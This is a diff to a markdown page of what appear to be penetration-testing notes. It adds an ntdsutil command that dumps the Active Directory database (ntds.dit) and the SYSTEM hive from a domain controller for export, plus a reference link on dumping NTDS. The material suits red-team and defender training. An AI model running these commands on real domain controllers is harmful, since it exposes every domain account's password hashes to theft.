@@ -13,6 +13,21 @@ weight : 50
 
 On Domain Controller - create snapshot with `vssadmin.exe`.
 
+## NTDSUtil
+
+```plain
+ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
+```
+
+The following files can then be exported
+
+```plain
+C:\Windows\Temp\NTDS\Active Directory\ntds.dit
+C:\Windows\Temp\NTDS\registry\SYSTEM
+```
+
+## Shadowcopy
+
 ### Step 1 - Create ShadowCopy
 
 ```plain
@@ -80,3 +95,4 @@ Example `NTDS.dit` and `SYSTEM` files zipped below.
 ## URL List
 
 - [Stealthbits.com - Extracting Password Hashes from the Ntds.dit File](https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/)
+- [Thehacker.recipes - Dumping NTDS](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds)
